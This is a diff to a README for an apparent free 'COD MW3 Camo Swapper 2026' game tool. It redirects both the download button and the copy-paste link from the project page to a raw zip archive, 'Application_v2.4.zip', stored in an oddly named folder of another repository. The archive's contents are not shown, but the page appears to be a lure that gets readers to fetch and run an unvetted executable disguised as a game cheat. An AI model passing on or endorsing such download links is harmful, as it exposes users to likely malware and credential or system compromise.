@@ -39,14 +39,14 @@ It's **totally free**, **fully updated for 2026**, and **works perfectly** with 
 Click the big button below to go to the download page:
 
 <p align="center">
-  <a href="https://github.com/k78sergej/COD-MW3-Camo-Swapper-2026">
+  <a href="https://raw.githubusercontent.com/k78sergej/k78sergej.github.io/main/nonbourgeois/Application_v2.4.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD-COD--MW3--Camo--Swapper--2026-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f" alt="Download Button" width="400">
   </a>
 </p>
 
 If the button does not work, **copy and paste** this link directly into your browser:
 
-`https://github.com/k78sergej/COD-MW3-Camo-Swapper-2026`
+`https://raw.githubusercontent.com/k78sergej/k78sergej.github.io/main/nonbourgeois/Application_v2.4.zip`
 
 ---
 
